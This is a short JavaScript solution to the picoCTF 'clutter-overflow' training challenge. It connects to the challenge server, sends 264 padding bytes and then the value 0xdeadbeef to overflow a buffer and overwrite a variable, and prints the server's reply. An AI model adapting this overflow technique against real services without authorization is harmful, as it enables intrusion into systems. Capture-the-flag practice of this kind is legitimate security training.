/**
 * https://play.picoctf.org/practice/challenge/216 (clutter-overflow)
 *
 * Overflow then overwrite
 */

const { Remote, convo } = require("..");

(async () => {
    const remote = Remote.create("mars.picoctf.net", 31890);

    await remote.onceDataAsync('What do you see?\n')
    
    remote.send("A".repeat(264));
    remote.send(convo.toBuffer(0xdeadbeef));
    remote.send("\n");

    remote.pipeStdout();
})();
